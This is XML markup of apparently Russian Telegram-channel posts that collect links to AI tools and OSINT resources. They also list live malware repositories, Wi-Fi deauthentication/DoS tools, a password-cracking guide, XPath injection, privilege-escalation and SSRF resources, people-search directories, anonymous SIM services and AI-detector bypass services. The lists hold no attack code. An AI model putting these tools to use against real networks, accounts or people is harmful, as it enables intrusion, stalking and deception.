      <text:p text:style-name="P39">2. PhotoMaker v2 (https://github.com/TencentARC/PhotoMaker) - весьма неплохой генератор аватарок от создателей PUBG; </text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">3. DeepLiveCam <text:s/>(https://github.com/hacksider/Deep-Live-Cam) - дипфейк генератор, работающий в режиме онлайн, подойдет для стримов;</text:span></text:p>
      <text:p text:style-name="P39">4. Active Recall <text:s/>(https://www.getrecall.ai/) - ИИ, который делает выжимки из подкастов, текста, PDF файлов, сайтов и т.д.</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6">5. AskHackers Search (https://askhackers.com/) - ИИ-поисковик, основанный на данных портала Hacker News.</text:span><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P39">Используем блага нейросетей. Часть 24:</text:p>
      <text:p text:style-name="P39">1. Make Me A Cover Letter <text:s/>(https://cover-letter-gpt-steel.vercel.app/) - поможет написать сопроводительное письмо к вашему резюме (на английском языке);</text:p>
      <text:p text:style-name="P39">2. LeiaPix (https://leiapix-ai.com/) <text:s/>- оживит ваши фотографии, есть триальная версия на 100 кредитов;</text:p>
      <text:p text:style-name="P39">3. Copilot Arena (https://github.com/lm-sys/copilot-arena) <text:s/>- бесплатное расширение для VSCode, добавляющее сразу несколько нейросетей для кодинга;</text:p>
      <text:p text:style-name="P39">4. Melodio (https://www.melodio.ai/) <text:s/>- нейро-радио, выдающее один длинный сет из разных треков;</text:p>
      <text:p text:style-name="P39">5. Firefly (https://blog.adobe.com/en/publish/2024/09/11/bringing-gen-ai-to-video-adobe-firefly-video-model-coming-soon#form) <text:s/>- мощный генератор видео от Adobe;</text:p>
      <text:p text:style-name="P39">6. FLUX Realtime <text:s/>(https://huggingface.co/spaces/KingNish/Realtime-FLUX) - новый бесплатный генератор картинок без цензуры, пока работает очень быстро;</text:p>
      <text:p text:style-name="P40">7. Fish <text:s/>(https://fish.audio/) - новая нейросеть для генерации голоса.</text:p>
      <text:p text:style-name="P38"><text:span text:style-name="T6">Собирая информацию по юридическим лицам, иногда можно наткнутся на ситуацию, что некоторые компании, кроме национальной регистрации, также зарегистрированы в реестре GLEIF (https://www.gleif.org). Такой компании присваивается идентификатор юридического лица (LEI). По сути просто ещё один регистрационный номер. По номеру или по названию в этом реестре тоже можно находить информацию о компании: https://search.gleif.org. Задумано это всё как единая система идентификации юридических лиц, благодаря которой должно повышаться доверие к компаниям зарегистрированным там. На счёт </text:span><text:soft-page-break/><text:span text:style-name="T6">повышения доверия - вопрос спорный, и не особо (для нас) важный. Но вот, в чём точно можно быть уверенным, это в том что там довольно замороченная процедура регистрации. Так как всё это придумала Международная организация по стандартизации (ISO), то и специальный стандарт (ISO 17442) под эту историю тоже запилили и там чётко прописали какие документы и сведения нужно предоставлять при регистрации. И именно в этом и есть полезный момент при сборе информации. В целом, регистрационные данные самой компании там будут приблизительно те же, что и в местном реестре юридических лиц. Но, в числе прочего, там будет указан реальный адрес, где реально находится компания (пример на фото) и они действительно это проверяют. Особенно хорошо это работает со всякими странами (типа Кипра) где вообще не заморачиваются с адресами регистрации и по адресу какой-нибудь адвокатской конторы может быть зарегистрировано насколько сотен фирм.</text:span></text:p>
      <text:p text:style-name="P42">Используем блага нейросетей. Часть 25:</text:p>
      <text:p text:style-name="P39">1. LipDub (https://www.lipdub.ai/) - генерирует липсинк кинематографического качества;</text:p>
      <text:p text:style-name="P39">2. StudyChat (https://www.studychat.app/) - топовая нейронка для учебы, которая делает шпаргалки, выделает важные тезисы и генерит проверочные тесты;</text:p>
      <text:p text:style-name="P39">3. Diffusers Image Outpaint <text:s/>(https://huggingface.co/spaces/fffiloni/diffusers-image-outpaint) - расширяет любые фотографии абсолютно бесплатно и без регистрации;</text:p>
      <text:p text:style-name="P39">4. Qwen-2.5 Math (https://qwenlm.github.io/blog/qwen2.5-math/) - следующая версия имбовой китайской математической нейросети, в которую добавили Python вычисления и не только;</text:p>
      <text:p text:style-name="P40">5. GameGen-O <text:s/>(https://github.com/GameGen-O/GameGen-O/) - ИИ, который генерирует игры с открытым миром на основе текстовых запросов, без необходимости кодить [пока не вышла в свет]</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T6">Продолжим раскрывать тему поисковых систем. Я уже как-то писал (https://t.me/Pulsechanel/491) про то что, в зависимости от ситуации, может возникнуть необходимость воспользоваться региональной поисковой системой </text:span><text:soft-page-break/><text:span text:style-name="T6">какой-то страны. Дополняя эту тему, нужно упомянуть ещё несколько полезных ресурсов, позволяющих оптимизировать процесс использования поисковых систем:</text:span></text:p>
      <text:p text:style-name="P39">https://www.startpage.com - по сути тот-же Google, но не привязанный к его трекерам, а значит выдающий +- нейтральные результаты. Основная польза в том, что можно удобно выбирать регион где искать и период за который искать. Ещё один полезный бонус это режим “Anonymous View”: под каждым результатом поиска есть соответствующая кнопка, перейдя по которой, мы, по сути, переходим на сайт через proxy startpage, с блокировкой cookie и трекеров</text:p>
      <text:p text:style-name="P39">https://www.searchenginecolossus.com - подборка поисковых систем, отсортированная по темам и регионам</text:p>
      <text:p text:style-name="P39">https://www.searchenginesindex.com - подборка поисковых систем, отсортированная по странам</text:p>
      <text:p text:style-name="P40">https://www.faganfinder.com - набор поисковых инструментов оптимизированных под разные темы, задачи и регионы</text:p>
      <text:p text:style-name="P39">Подборка сервисов для водителей:</text:p>
      <text:p text:style-name="P39">1. Speedcamonline (https://speedcamonline.ru/) - карта всевозможных камер ГИБДД по всей России, с углом, точным расположением и дальностью обзора;</text:p>
      <text:p text:style-name="P39">2. ГАИ (https://госавтоинспекция.рф/milestones) | Московский транспорт <text:s/>(https://transport.mos.ru/mostrans/cameras) - официальные карты камер, по которым можно понять их актуальное расположение;</text:p>
      <text:p text:style-name="P39">3. Easy Ride (https://easyrideapp.com/) - неплохое приложение с актуальными постами ДПС, наличием медицинской службы на них и рейдов. Метки модерируются пользователями. Из минусов: куча надоедливой рекламы.</text:p>
      <text:p text:style-name="P39">4. GPS АнтиРадар (https://play.google.com/store/apps/details?id=air.StrelkaSDFREE&amp;hl=ru) - самое популярное анти-радар приложение на Android, улавливает все камеры. Есть платная версия без рекламы. </text:p>
      <text:p text:style-name="P39">5. Organic Maps - форк maps me, без рекламы, с возможностью загрузки карты местности и оффлайн использования.</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P39">Очеловечиваем текст, созданный ИИ:</text:p>
      <text:p text:style-name="P39">1. uncheck.ai (https://uncheck.ai/) - относительно новый бесплатный сервис, обходящий большинство ИИ-детектов и антиплагиат;</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">2. Bypass AI - рерайт/антидетект ИИ на стеройдах. Легко обходит GPTZero и подобные сервисы:</text:span></text:p>
      <text:p text:style-name="P39">3. hix.ai <text:s/>(https://bypass.hix.ai/ru/anti-ai-detector) - еще один бесплатный сервис, который может очеловечить текст, написанный нейросетью;</text:p>
      <text:p text:style-name="P40">4. Humanaize AI <text:s/>(https://www.humanizeai.pro/) - неплохой рерайтер, можно выбрать определенный стиль, если залогиниться</text:p>
      <text:p text:style-name="P39">Инструменты для поиска электронной почты по домену:</text:p>
      <text:p text:style-name="P39">1. Snov.io Email Finder: (https://snov.io/email-finder) это один из лучших инструментов для поиска электронной почты. Он позволяет быстро находить адреса электронной почты, связанные с любым доменом. Помимо поиска email, Snov.io также предоставляет функции для проверки валидности найденных контактов. Есть возможность интеграции с CRM-системами</text:p>
      <text:p text:style-name="P39">2. Experte Email Finder: (https://www.experte.com/email-finder) простой и эффективный сайт для поиска email-адресов по доменам. Этот инструмент подходит для быстрого сбора контактов без лишних функций и сложных настроек. Он будет полезен тем, кто ищет минималистичный и интуитивно понятный сервис для выполнения конкретной задачи</text:p>
      <text:p text:style-name="P39">3. EmailFinder: (https://github.com/Josue87/EmailFinder) это опенсорсный проект, размещенный на GitHub. Этот инструмент позволяет находить email-адреса, связанные с доменом, через сканирование общедоступной информации в интернете. Он более технически сложен по сравнению с веб-сервисами</text:p>
      <text:p text:style-name="P39">4. Infoga: (https://github.com/GiJ03/Infoga) этот проект активно используется специалистами по информационной безопасности и теми, кто занимается OSINT (разведка на основе открытых данных). Infoga позволяет проводить глубокий анализ домена и поиск связанных email-адресов</text:p>
      <text:p text:style-name="P44">5. Findemail.io: (https://findemail.io/) использует несколько источников данных для поиска адресов, связанных с определенным доменом. Сервис позволяет проверять валидность адресов и использовать различные фильтры для более точного поиска</text:p>
      <text:p text:style-name="P39">Используем блага нейросетей. Часть 26:</text:p>
      <text:p text:style-name="P39">1. Qwen2.5-Coder-32B-Instruct (https://huggingface.co/Qwen/Qwen2.5-Coder-32B-Instruct) - новая неплохая китайская нейронка для программистов, мощнее ChatGPT, бесплатная;</text:p>
      <text:p text:style-name="P39">2. Flux 1.1 Ultra (https://glif.app/@Lemn/glifs/cm37fn42i000aono7ngizlr5z) - очередная нейросеть для генерации изображений, первые 20 промтов бесплатны; </text:p>
      <text:p text:style-name="P39">3. FileDash AI (http://www.filedash.ai/) - инструмент, который превращает наборы данных в интерактивные панели мониторинга;</text:p>
      <text:p text:style-name="P39">4. DreamCut (https://dreamcut.ai/) - видеоредактор на основе ИИ и средство для записи экрана, которое работает прямо из браузера;</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6">5. <text:s/>Plus AI (https://www.plusdocs.com/) - бесплатно сгенерит вам крутую презентацию в Google Slides или PowerPoint.</text:span><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P39">Онлайн-сервисы для поиска поддоменов сайта. Поиск поддоменов (субдоменов) является важной частью разведки. Наличие незащищенного субдомена может привести к большим проблемам в плане безопасности:</text:p>
      <text:p text:style-name="P42">1. DNSDumpster: (https://dnsdumpster.com/) это инструмент для получения информации о домене, такую как: IP-адрес, записи DNS, записи MX, записи NS, поиск поддоменов и многое другое</text:p>
      <text:p text:style-name="P42">2. NMMapper: (https://www.nmmapper.com/sys/tools/subdomainfinder/) анализирует домен с помощью различных инструментов, таких как Sublist3r, Amass, Nmap и т. д. Используя бесплатный сервис NMMapper, вам не придется устанавливать перечисленные инструменты</text:p>
      <text:p text:style-name="P39">3. Subdomainfinder: (https://subdomainfinder.c99.nl/) специально разработан для получения списка поддоменов корневого домена. После результата вы увидите субдомен, который можете посетить, просто кликнув по нему, IP-адрес, и другую полезную информацию, например, туннелируется ли он через CloudFlare или нет</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">4. BinaryEdge: (https://docs.binaryedge.io/search/) это сервис, который позволяет искать поддомены для доменного имени. Он также умеет искать: email-адреса в утечках данных; изображения, связанные с доменом; текст в изображениях (документацию смотрите с VPN)</text:span></text:p>
      <text:p text:style-name="P43">5. SecurityTrails: (https://docs.securitytrails.com/) имеет большую базу доменов. История записей DNS 12-летней давности. Он также предлагает список всех поддоменов корневого домена вместе с хостингом и провайдером почты</text:p>
      <text:p text:style-name="P45">При упоминании телефонных справочников у кого-то может возникнуть ощущение, что это что-то доисторическое и давно канувшее в лету. И это действительно так, если говорить про их прямое назначение. А вот если рассматривать их с точки зрения OSINT, то это очень даже рабочий и вполне информативный инструмент. Например, благодаря телефонным справочникам неоднократно удавалось установить родственников фигуранта. Ну или найти адреса к которым человек имеет/имел отношение. Ну и так далее. В любом случае, если, в ходе работы, попадается какой-то адрес, стоит чекнуть справочник, это недолго, но иногда информативно.</text:p>
      <text:p text:style-name="P39">http://i.spravkaru.net - телефонный справочник городских номеров (Украина, Беларусь, РФ, Молдова, Латвия, Казахстан). Ищет по фамилии или телефону</text:p>
      <text:p text:style-name="P39">spravochnik109.link (http://spravochnik109.link/) - то же самое что и предыдущий, но менее удобный т.к. сначала нужно указать город</text:p>
      <text:p text:style-name="P39">http://numberway.com - по номеру телефона ищет абонента в США. Там же есть каталог телефонных справочников (по типу жёлтых страниц) большого количества стран</text:p>
      <text:p text:style-name="P39">https://www.411.com - телефонный справочник США. Ищет по фамилии или по номеру </text:p>
      <text:p text:style-name="P39">https://www.whitepages.com - телефонная книга и адресный справочник США. Находит ФИО, адрес, телефон</text:p>
      <text:p text:style-name="P39">http://personlookup.com.au <text:s/>- телефонных справочник Австралии. Ищет по номеру, имени или адресу</text:p>
      <text:p text:style-name="P39">https://www.teatmik.ee - телефонный справочник Эстонии. Ищет по компаниям, ФИО или номеру телефона <text:s/></text:p>
      <text:p text:style-name="P42">https://www.192.com - телефонная книга и адресный справочник Великобритании, <text:s/>также есть поиск компаний и поиск по адресам (по адресу покажет оценочную стоимость недвижимости и зарегистрированных людей)</text:p>
      <text:p text:style-name="P43">https://www.canada411.ca - телефонная книга и адресный справочник Канады. Ищет компании и людей по адресу, ФИО или телефону</text:p>
      <text:p text:style-name="P39">Анализируем страницу ВКонтакте. Часть 2:</text:p>
      <text:p text:style-name="P39">1. https://topdb.ru/username <text:s/>- старенькая база, где можно найти предыдущие версии некоторых страниц:</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">2. https://vkpt.info/ - комплексный инструмент анализа ВК страниц;</text:span></text:p>
      <text:p text:style-name="P39">3. @VKHistoryRobot <text:s/>- бот, показывающий историю изменений страницы + старые версии;</text:p>
      <text:p text:style-name="P39">4. @social_graph_osint_bot <text:s/>- бот для анализа друзей;</text:p>
      <text:p text:style-name="P39">5. https://github.com/AdrianGuretto/OSINTvk - парсер открытых данных из ВК;</text:p>
      <text:p text:style-name="P40">6. https://github.com/DIJIRO/vkOsint <text:s/>- Python пакет для поиска аккаунтов по номеру телефона.</text:p>
      <text:p text:style-name="P39">Подборка образцов вредоносных программ. Они не деактивированы и представляют реальную угрозу. Не скачивайте их, если не уверены в том, что делаете. Используйте для исследований только изолированные программные среды. В этих коллекциях много червей, которые заразят все, до чего смогут дотянуться:</text:p>
      <text:p text:style-name="P39">1. theZoo: (https://github.com/ytisf/theZoo) активно пополняемая коллекция вредоносных программ, собранная специально для исследователей и специалистов по кибербезопасности</text:p>
      <text:p text:style-name="P39">2. Malware-Feed: (https://github.com/MalwareSamples/Malware-Feed) коллекция вредоносных программ от virussamples.com</text:p>
      <text:p text:style-name="P39">3. Malware samples: (https://github.com/jstrosch/malware-samples) пополняемый github-репозиторий с вредоносами, к которым прилагаются упражнения по анализу вредоносного ПО</text:p>
      <text:p text:style-name="P39">4. vx-underground: (https://www.vx-underground.org/samples.html) еще одна обширная и постоянно растущая коллекция бесплатных образцов вредоносных программ</text:p>
      <text:p text:style-name="P39">5. Malshare: (https://malshare.com/) репозиторий, который помимо образцов малвари предлагает дополнительные данные для YARA</text:p>
      <text:p text:style-name="P39">6. MalwareBazaar: (https://bazaar.abuse.ch/) проект, целью которого является обмен образцами вредоносного ПО с поставщиками антивирусных программ и сообществом экспертов по информационной безопасности. Поддерживает собственное API</text:p>
      <text:p text:style-name="P39">7. VirusShare: (https://virusshare.com/) большой репозиторий вредоносных программ с обязательной регистрацией</text:p>
      <text:p text:style-name="P20"><text:soft-page-break/><text:span text:style-name="T6">8. The Malware Museum: (https://archive.org/details/malwaremuseum) вирусы, распространявшиеся в 1980-х и 1990-х годах. Практически безобидны на фоне остальных ссылок из этого раздела и представляют скорее историческую ценность</text:span></text:p>
      <text:p text:style-name="P39">Анонимные SIM/SMS сервисы:</text:p>
      <text:p text:style-name="P39">1. simsup <text:s/>(https://simsup.net/) - сервис по продаже анонимных сим-карт по всему миру. Оплата XMR/BTC.</text:p>
      <text:p text:style-name="P39">2. sms4sats <text:s/>(https://sms4sats.com/) - популярный зарубежный сервис приема SMS;</text:p>
      <text:p text:style-name="P39">3. crypton (https://crypton.sh/) <text:s/>- сервис, предоставляющий анонимные сим-карты;</text:p>
      <text:p text:style-name="P42">4. JMP <text:s/>(https://jmp.chat/) - сервис отправки SMS-сообщений и осуществления звонков через XMPP;</text:p>
      <text:p text:style-name="P42">5. monerosms (https://monerosms.com/) <text:s/>- отправка анонимных SMS, оплата в XMR;</text:p>
      <text:p text:style-name="P40">6. smspool (https://www.smspool.net/) | juicysms (https://juicysms.com/) | textverified <text:s/>(https://www.textverified.com/) - еще сервисы приёма SMS.</text:p>
      <text:p text:style-name="P39">Подборка утилит для проведения DoS и дуатентификации беспроводных сетей:</text:p>
      <text:p text:style-name="P39">1. Mass-deauth: (https://github.com/Andy-Maclachlan/mass-deauth/) Скрипт для массовой деаутентификации в сетях 802.11</text:p>
      <text:p text:style-name="P39">2. modwifi: (https://github.com/vanhoefm/modwifi/) Инструмент для проведения продвинутых атак на Wi-Fi с использованием стандартного оборудования</text:p>
      <text:p text:style-name="P39">3. netattack: (https://github.com/chrizator/netattack/) Скрипт на Python для сканирования локальной сети на наличие Wi-Fi-сетей и проведения атак деаутентификации</text:p>
      <text:p text:style-name="P39">4. ska: (https://github.com/0x90/wifi-arsenal/tree/master/ska/) Фреймворк для перехвата пакетов IEEE802.11 и создания пакетов деаутентификации</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T6">5. zizzania: (https://github.com/cyrus-and/zizzania/) Автоматизированная атака деаутентификации</text:span><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">Полное руководство по John the Ripper. Руководство состоит из 7 частей:</text:span></text:p>
      <text:p text:style-name="P39">1. Знакомство и установка John the Ripper (https://hackware.ru/?p=13396#11)</text:p>
      <text:p text:style-name="P39">2. Утилиты для извлечения хешей (https://hackware.ru/?p=13449)</text:p>
      <text:p text:style-name="P39">3. Как запустить взлом паролей в John the Ripper (как указать маски, словари, хеши, форматы, режимы) (https://hackware.ru/?p=13537)</text:p>
      <text:p text:style-name="P39">4. Практика и примеры использования John the Ripper (https://hackware.ru/?p=13801)</text:p>
      <text:p text:style-name="P39">5. Атака на основе правил (https://hackware.ru/?p=14259)</text:p>
      <text:p text:style-name="P39">6. Брут-форс нестандартных хешей (https://hackware.ru/?p=15567)</text:p>
      <text:p text:style-name="P40">7. Johnny - графический интерфейс для John the Ripper (https://hackware.ru/?p=15961) John the Ripper (https://kali.tools/?p=747) - это популярный взломщик паролей, который умеет выполнять брут-форс как с использованием центрального процессора, так и видео карты, поддерживающий множество алгоритмов. Если быть более точным - это офлайн взломщик (онлайн взломщики брут-форсят службы подключаясь к ним, а офлайн взломщики работают с захваченными хешами (файлами) к которым подбирают пароль). Режимы работы: Single Crack Mode: Использует информацию о пользователе и системе (например, имя пользователя) для попытки расшифровать пароль; Dictionary Mode: Использует словарь паролей (список слов) для перебора возможных вариантов. Это один из наиболее часто используемых режимов; Incremental Mode: Брутфорс-атака, которая перебирает все возможные комбинации символов. Этот режим наиболее универсален, но и самый медленный; External Mode: Позволяет пользователям писать свои собственные правила для атак.</text:p>
      <text:p text:style-name="P39">OSINT: Подборка инструментов для сбора информации:</text:p>
      <text:p text:style-name="P39">1. Hoper: (https://github.com/gabamnml/hoper) следует по URL и определяет конечный пункт назначения куда ведёт ссылка</text:p>
      <text:p text:style-name="P39">2. flashlight: (https://github.com/galkan/flashlight) способствует в сборе информации, при этом программа имеет три базовых типа сканирования: пассивное сканирование, активное сканирование и сканирование скриншотов, а также один тип анализа</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">3. Habu: (https://github.com/portantier/habu) это набор инструментов на Python предназначенных для сбора информации, исследования и хакинга сети</text:span></text:p>
      <text:p text:style-name="P39">4. HostHunter: (https://github.com/SpiderLabs/HostHunter) это инструмент разведки для обнаружения имён хостов используя техники OSINT</text:p>
      <text:p text:style-name="P40">5. Nullinux: (https://github.com/m8r0wn/nullinux) это внутренний инструмент тестирования на проникновение для Linux, который может использоваться для перечисления информации ОС, информации доменов, общих сетевых папок, директорий и пользователей через SMB</text:p>
      <text:p text:style-name="P39">Знакомство с XPath Injection. XPath инъекции - это тип инъекционной атаки, которая использует уязвимости в обработке сервером пользовательского ввода. XPath (XML Path Language) - язык запросов для XML документов, в общем похожий на SQL для баз данных. Правда вместо таблиц, колонок и строчек XPath оперирует нодами в XML дереве. Атаки с использованием XPath выполняются путём вставки вредоносного кода в поля ввода для изменения поведения запроса и извлечения конфиденциальной информации из базы данных приложени</text:p>
      <text:p text:style-name="P39">Подробное руководство по XPath-инъекциям (https://raz0r.name/articles/vvedenie-v-xpath-inekcii/comment-page-1/)</text:p>
      <text:p text:style-name="P39">XPath Injection | OWASP Foundation (https://owasp.org/www-community/attacks/XPATH_Injection)</text:p>
      <text:p text:style-name="P39">Введение в XPath инъекции: примеры (https://xakep.ru/2008/06/24/44160/)</text:p>
      <text:p text:style-name="P39">Борьба с XPath инъекциями в .NET (http://www.tkachenko.com/blog/archives/000385.html)</text:p>
      <text:p text:style-name="P43">XPath Injection: A beginners guide (более свежее руководство) (https://tcm-sec.com/understanding-xpath-injection-a-beginners-guide/)</text:p>
      <text:p text:style-name="P42">Подборка ресурсов для эскалации привелегий в Linux. Эскалация привилегий - это процесс, при котором злоумышленник получает более высокий уровень доступа к компьютерной системе или сети, чем тот, что ему был первоначально предоставлен</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T6">1. Семинар по локальной эскалации привилегий Windows / Linux: (https://github.com/sagishahar/lpeworkshop) семинар по эскалации привилегий охватывает все известные (в то время) векторы атак локальной эскалации </text:span><text:soft-page-break/><text:span text:style-name="T6">привилегий пользователей как в операционных системах Linux, так и в операционных системах Windows и включает в себя слайды, видео, тестовые виртуальные машины</text:span></text:p>
      <text:p text:style-name="P39">2. linux-exploit-sugester.sh: (https://github.com/mzet-/linux-exploit-suggester) инструмент аудита эскалации привилегий Linux, написанный на bash</text:p>
      <text:p text:style-name="P40">3. linuxprivchecker.py (http://www.securitysift.com/download/linuxprivchecker.py): (http://www.securitysift.com/download/linuxprivchecker.py) этот скрипт предназначен для локального выполнения в Linux-системе перечисления базовой системной информации и поиска общих векторов повышения привилегий, таких как файлы, доступные для записи по всему миру, неправильные настройки, пароли с открытым текстом и применимые эксплойты</text:p>
      <text:p text:style-name="P39">Используем блага нейросетей. Часть 27:</text:p>
      <text:p text:style-name="P39">1. Loras (https://www.loras.dev/) - бесплатный генератор изображений на базе Flux, работает только c VPN </text:p>
      <text:p text:style-name="P39">2. Dzine (https://dzine.ai/) - ИИ-редактор с очень широким функционалом, есть бесплатная версия;</text:p>
      <text:p text:style-name="P39">3. Hailuo (https://www.hailuo.ai/audio) - бесплатная нейросеть, которая за 10 секунд скопирует ваш голос и не только:</text:p>
      <text:p text:style-name="P39">4. change.photos (https://www.change.photos/tools/compress) - инструмент для сжатия фото с минимальной потерей качества;</text:p>
      <text:p text:style-name="P40">5. PrivateGPT (https://github.com/zylon-ai/private-gpt) - приватная, локальная версия ChatGPT для тех, кто опасается утечки данных.</text:p>
      <text:p text:style-name="P39">Подборка инструментов для проведения SSRF-атак. Server-Side Request Forgery (SSRF) - это уязвимость, которая позволяет злоумышленнику заставить сервер отправлять запросы к произвольным адресам, что может привести к утечке данных или размещению вредоносного кода. При этом злоумышленник может контролировать либо весь запрос целиком, либо его отдельные части (например, домен)</text:p>
      <text:p text:style-name="P39">1. curl: (https://curl.se/) Командная утилита для отправки запросов к URL. Зачастую используется в скриптах для тестирования SSRF уязвимостей.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">2. Postman: (https://www.postman.com/) Инструмент для работы с API, который позволяет отправлять HTTP-запросы к серверу, модифицируя их по необходимости. Может быть полезен для тестирования серверного поведения.</text:span></text:p>
      <text:p text:style-name="P39">3. Gobuster: (https://github.com/OJ/gobuster) Инструмент для брутфорсинга пути и поддоменов. Его можно использовать для поиска уязвимых точек, где может быть полезна SSRF.</text:p>
      <text:p text:style-name="P42">4. Fiddler: (https://www.telerik.com/fiddler) Сетевой отладчик для HTTP, который может захватывать и модифицировать трафик, включая запросы к серверу. Полезен для тестирования реакции сервера на различные ссылки.</text:p>
      <text:p text:style-name="P43">5. RequestBin: (https://requestbin.com/) Сервис для тестирования HTTP-запросов. Можно использовать для приема и анализа запросов, которые отправляются через SSRF уязвимости.</text:p>
      <text:p text:style-name="P39">Подборка инструментов для мониторинга хостов. Мониторинг хостов - это процесс отслеживания работы аппаратного обеспечения, сети, операционной системы и приложений. Правильно настроенный мониторинг позволяет вовремя заметить надвигающуюся опасность и ликвидировать её до наступления инцидента:</text:p>
      <text:p text:style-name="P39">1. Zentral: (https://github.com/zentralopensource/zentral) решение для мониторинга конечных точек. Объединяет сбор журналов событий при помощи osquery с гибкой системой уведомлений и различными хранилищами данных: ElasticStack, Azure Log Analytics, Splunk.</text:p>
      <text:p text:style-name="P39">2. Fleetdm: (https://github.com/fleetdm/fleet) еще один инструмент для мониторинга хостов, который использует osquery для получения журналов событий и собирает их с целевых систем в реальном времени.</text:p>
      <text:p text:style-name="P39">3. POFR: (https://github.com/gmagklaras/pofr) клиент-серверный «черный ящик», который регистрирует данные о выполнении процессов, доступе к файлам и сетевых соединениях в Linux-системах, а затем передает отчеты на сервер по протоколу SSH.</text:p>
      <text:p text:style-name="P39">4. IntelMQ: (https://github.com/certtools/intelmq) система автоматизированной обработки инцидентов, которую можно использовать для сбора данных для дальнейшего анализа. Имеет модульную структуру, состоящую из ботов для извлечения, обогащения и записи данных.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T6">5. Velociraptor: (https://github.com/Velocidex/velociraptor) инструмент для сбора информации о состоянии хостов при помощи гибкого языка запросов VQL. Позволяет в значительной степени автоматизировать сбор разнообразных криминалистических артефактов.</text:span></text:p>
      <text:p text:style-name="P40">6. Meerkat: (https://github.com/TonyPhipps/Meerkat) набор модулей PowerShell, предназначенных для сбора артефактов из систем на базе Windows без предварительной установки агента. Сценарии использования включают реагирование на угрозы, поиск угроз, базовый мониторинг, сравнение снапшотов.</text:p>
      <text:p text:style-name="P39">геолокация:</text:p>
      <text:p text:style-name="P39">Бесплатные альтернативы GeoGuessr (кто не в курсе, он превратился в помойку с абсолютно неадекватным ценником, в которой бесплатно можно только зарегистрироваться. Хотя такими темпами скоро и регистрация будет платной):</text:p>
      <text:p text:style-name="P39">https://www.geohub.gg - почти такой же функционал, что и GeoGuessr. Выбираешь вид поиска (общий, достопримечательности и т.д.), где искать (весь мир или конкретная страна) и тренируешься. Можно просто искать, можно выполнять испытания. </text:p>
      <text:p text:style-name="P39">https://hideandseek.world - игра в прятки на карте. Можно самому загадать место и другие будут искать или самому искать место которое загадал другой пользователь. А можно соревноваться с другими в поиске месте выбранного системой. Бесплатно - две игры в день, если не хватает, то самый дорогой прем стоит 3$. Идеальный вариант для писькамерства - соревнования, рейтинги, награды и т.д.</text:p>
      <text:p text:style-name="P40">https://openguessr.com - вариант для тех кто хочет просто покачать навык геолокации. Можно не регистрироваться, лимитов нет. Регистрация нужна только для мультиплеера и соревнований. Можно играть по мировой карте, столицам или достопримечательностям. Также можно выбрать какую-то конкретную страну.</text:p>
      <text:p text:style-name="P39">Определяем фотошоп и генерацию ИИ в 2025:</text:p>
      <text:p text:style-name="P46">Forensically (https://t.me/KladovkaPavlu/768) - комплексный инструмент проверки фотографий на предмет изменений;</text:p>
      <text:p text:style-name="P47">Foto Forsenics <text:s/>(https://t.me/KladovkaPavlu/58) - <text:s/>сайт для криминалистического анализа фотографий, который позволяет понять, были ли они изменены в любом из редакторов;</text:p>
      <text:p text:style-name="P39">Fake Profile Detector (https://chrome.google.com/webstore/detail/fake-profile-detector-dee/jbpcgcnnhmjmajjkgdaogpgefbnokpcc) - браузерное расширение, позволяющее проверить фото лица на предмет генерации его ИИ;</text:p>
      <text:p text:style-name="P39">Imageforensic <text:s/>(https://www.imageforensic.org/) - еще один криминалистический инструмент проверки изображений на предмет любых изменений;</text:p>
      <text:p text:style-name="P39">sightengine (https://sightengine.com/detect-ai-generated-images) - простая онлайн тулза проверки фотографии на предмет генерации ИИ;</text:p>
      <text:p text:style-name="P39">decopy (https://decopy.ai/ai-image-detector/) - инструмент проверки изображений на предмет генерации моделями Midjourney, Stable Diffusion, DALL·E и Flux</text:p>
      <text:p text:style-name="P41">Там же есть раздел https://education.openguessr.com - где можно изучать матчасть: </text:p>
      <text:p text:style-name="P39">В разделе “Викторина” можно пройти тест на знание стран, регионов или городов, выбирая к чему относятся какие-то отличительные знаки (например номера автомобилей) </text:p>
      <text:p text:style-name="P39">В разделе "Руководства" - гайды как правильно искать. От инструкций как пользоваться самими картами, до советов как правильно идентифицировать и отличать дорожную разметку </text:p>
      <text:p text:style-name="P40">В разделе “Страны” собрана информация о странах. Статистика, карты, примеры дорожных знаков и разметки, достопримечательности и т.д., а также всякие видео про страну.</text:p>
      <text:p text:style-name="P39">Работа по юридическим лицам часто подразумевает изучение большого количества источников, особенно если это что-то, что охватывает юрисдикцию нескольких стран. В таких ситуациях часто появляется необходимость найти какой-то конкретный реестр в какой-то конкретной стране. Проблема не новая, но знать о существовании таких подборок нужно:</text:p>
      <text:p text:style-name="P39">https://id.occrp.org/databases/ - каталог (с разбивкой по регионам и странам) коммерческих регистров, реестров интеллектуальной собственности, правительственных ресурсов, реестров судебных решений и т.д.</text:p>
      <text:p text:style-name="P39">https://www.disputesregister.org/advice/company-registries-by-country - список реестров компаний по странам</text:p>
      <text:p text:style-name="P39">https://ebra.be/worldwide-registers/ - каталог реестров компаний по странам с картой</text:p>
      <text:p text:style-name="P39">https://e-justice.europa.eu/topics/registers-business-insolvency-land/business-registers-search-company-eu_en - Европейский портал электронного правосудия. Позволяет искать информацию о компаниях из национальных реестров предприятий стран ЕС</text:p>
      <text:p text:style-name="P40">https://e-justice.europa.eu/topics/registers-business-insolvency-land/bankruptcy-insolvency-registers-search-insolvent-debtors-eu_en - позволяет искать банкротов и неплатежеспособные организации в пределах ЕС</text:p>
